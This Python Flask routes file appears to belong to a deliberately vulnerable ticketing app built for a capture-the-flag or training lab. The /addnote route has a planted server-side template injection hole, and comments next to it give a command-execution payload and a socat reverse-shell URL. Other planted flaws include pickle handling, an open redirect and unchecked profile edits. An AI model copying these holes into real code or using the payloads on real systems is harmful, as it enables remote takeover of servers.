from types import MethodType
import os, pickle, base64
from flask import current_app as app
from flask import (
    Markup,
    json,
    redirect,
    make_response,
    render_template,
    flash,
    request,
    session,
    url_for,
    send_from_directory,
)
from flask.templating import render_template_string
from flask_login import login_required, logout_user, current_user, login_user
from flask_user import roles_required
from werkzeug.security import generate_password_hash
from werkzeug.exceptions import HTTPException
from werkzeug.utils import secure_filename
from functools import wraps
from .forms import AttachmentForm, LoginForm, ProfileForm, RegisterForm, TicketForm
from .models import User, Post
from . import db
from . import login_manager


@app.route("/home", methods=["GET"])
@app.route("/index", methods=["GET"])
@app.route("/", methods=["GET"])
def home():
    if request.method != "GET":
        return make_response("Method not supported", 405)
    return render_template("home.html")


@app.route("/register", methods=["GET", "POST"])
def register():

    if current_user.is_authenticated:
        return redirect(url_for(".home"))

    form = RegisterForm()
    if request.method == "POST":
        if form.validate_on_submit():
            email = request.form.get("email")
            password = request.form.get("password")

            existing_user = User.query.filter_by(email=email).first()
            if existing_user is None:
                user = User(
                    email=email,
                    password=generate_password_hash(password, method="sha256"),
                )
                user.set_password(form.password.data)
                db.session.add(user)
                db.session.commit()
                login_user(user)
                return redirect(url_for(".home"))

    return render_template(
        "register.html",
        title="Register",
        form=form,
        description="Register",
        body="Register pizza",
    )


@app.route("/login", methods=["GET", "POST"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for(".home"))

    form = LoginForm()
    # validation
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        if user and user.check_password(password=form.password.data):
            login_user(user)
            next_page = request.args.get("next")
            return redirect(next_page or url_for(".home"))

        flash("Invalid username and/or password")
        return redirect(url_for(".login"))
    return render_template(
        "login.html",
        form=form,
        title="Log in.",
        template="login",
        body="login with your account.",
        description="login",
    )


@app.errorhandler(HTTPException)
def handle_exception(e):
    """Return JSON instead of HTML for HTTP errors."""
    # start with the correct headers and status code from the error
    response = e.get_response()
    # replace the body with JSON
    response.data = json.dumps(
        {
            "code": e.code,
            "name": e.name,
            "description": e.description,
        }
    )
    response.content_type = "application/json"
    return response


@login_manager.user_loader
def load_user(user_id):
    if user_id is not None:
        return User.query.get(user_id)
    return None


@login_manager.unauthorized_handler
def unauthorized():
    flash("Please log in to continue.")
    return redirect(url_for(".login"))


# ------------------------authorization required pages ----------------------


@app.route("/logout")
@login_required
def logout():
    logout_user()
    flash("You are now logged out. Thanks!")
    return redirect(url_for(".login"))


@app.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    """
    GET gets the user profile
    POST edits the user profile
    """
    if request.method == "GET":
        return render_template(
            "profile.html",
            title="This is your profile!",
            description="profile",
            current_user=current_user,
            body="you are logged in!",
        )
    if request.method == "POST":
        return render_template(
            "profile.html",
            title="Edit your profile!",
            description="edit",
            current_user=current_user,
            body="Edit your profile!",
        )
    else:
        flash("Method not allowed!")
        return redirect(url_for(".profile"))


@app.route("/profile/edit/<id>", methods=["GET", "POST"])
@login_required
def edit_profile(id):
    form = ProfileForm()
    if request.method == "GET":
        return render_template("editprofile.html", form=form)

    if request.method == "POST":
        if request.form['submit'] == "Cancel":
            return redirect(url_for(".profile"))
        if form.validate_on_submit():
            body = request.form.get("body")
            user = User.query.get(id)
            user.info = body
            db.session.commit()

        return redirect(url_for(".profile"))



@app.route("/posts", methods=["GET"])
@login_required
def posts():
    """gets posts and posts posts"""
    posts = Post.query.all()
    form = AttachmentForm("attach file")

    if request.method == "GET":
        return render_template(
            "posts.html", posts=posts, form=form, title="Open Tickets"
        )


@app.route("/create", methods=["GET", "POST"])
@login_required
def create():
    """creates a new post"""
    form = TicketForm()
    # TODO: rate limiting
    if request.method == "POST":
        if form.validate_on_submit():
            body = request.form.get("body")
            post = Post(body=body, attachment=None)
            db.session.add(post)
            db.session.commit()
            flash(f"Ticket #{post.id} Added!")
            return redirect(url_for(".posts"))
        else:
            print(form.errors)
            return redirect(url_for(".profile"))

    return render_template("create.html", form=form, title="Create a ticket.")


# -------------- admin functions ------------------------------


@app.route("/attach/<id>", methods=["GET", "POST"])
@login_required
def attach(id):
    if request.method == "GET":
        form = AttachmentForm()
        return render_template("attach.html", form=form, id=id)
    # TODO: CSRF check?
    elif request.method == "POST":
        if not current_user.isadmin:
            flash("MuSt bE aDmIn!")
            return
        else:
            file = request.files["file"]

            if file.filename == "":
                flash("No file selected!")
                return redirect(url_for(".posts"))

            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                filepath = os.path.join(app.config["ATTACHMENTS_DIR"], filename)

                if os.path.isfile(filepath):
                    flash("file already exists")
                    return redirect(url_for(".posts"))
                else:
                    file.save(filepath)

                post = Post.query.get(id)
                post.attachment = filepath
                db.session.commit()
                return redirect(url_for(".posts"))
            else:
                return redirect(url_for(".posts"))


@app.route("/archive/<id>", methods=["POST"])
@login_required
def archive(id):
    """
    archives json'd or pickled tickets so we can send them to our
    monitoring apps
    """
    if request.method == "GET":
        return redirect(url_for(".posts"))
    else:
        post = Post.query.get(id)
        data = pickle.dumps(post.body)
        filename = id + ".pickle"
        filepath = os.path.join(app.config["ATTACHMENTS_DIR"], filename)
        try:
            f = open(filepath, "wb")
            f.write(data)
            f.close()
            flash("Ticket archived!")

            try:
                Post.query.filter_by(id=id).delete()
                db.session.commit()

            except Exception as e:
                print(e)

            return redirect(url_for(".posts"))

        except os.error as e:
            print(e)
            return redirect(url_for(".posts"))


@app.route("/restore/<id>", methods=["GET"])  # or post or ?
@login_required
def restore(id):
    """
    admin function to restore archived ticket
    this is where we could instroduce json depickling
    vulnerability
    """
    return redirect(url_for(".posts"))


# todo change this route to something that won't be found with gobuster et al
# so they have to do code review to find it
@app.route("/addnote/<id>/<note>", methods=["GET", "POST"])
@login_required
def addnote(id, note):
    """create a template for this page"""
    if not current_user.isadmin:
        # TODO: update this to render a different template?
        print("user not admin")
        flash("you must be admin to do this!")
        return redirect(url_for(".posts"))

    if request.method == "GET":
        # TODO: do some sanitization here
        # note = "{{request.application.__globals__.__builtins__.__import__('os').popen('cd ~; ls').read()}}"
        # TODO: This is SSTI location for www-data shell
        # TODO: add this to db then?
        # rev shell
        # http://127.0.0.1:5000/addnote/1/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('socat%20exec:%22bash%20-li%22,pty,stderr,setsid,sigint,sane%20tcp:127.0.0.1:4444').read()%7D%7D
        return render_template_string(f"<h1>Added Note to Ticket: {id}<h1><p>{note}")

    if request.method == "POST":
        return render_template(url_for(".posts"))


# ------------------------ File Functions and Routes ---------------------------


def allowed_file(filename):
    return (
        "." in filename
        and filename.rsplit(".", 1)[1].lower() in app.config["ALLOWED_EXTENSIONS"]
    )


@app.route("/attachments/<filename>")
@login_required
def uploaded_file(filename):
    print(filename)
    return send_from_directory(
        app.config["ATTACHMENTS_DIR"],
        filename,
    )


@app.after_request
def apply_caching(response):
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    return response
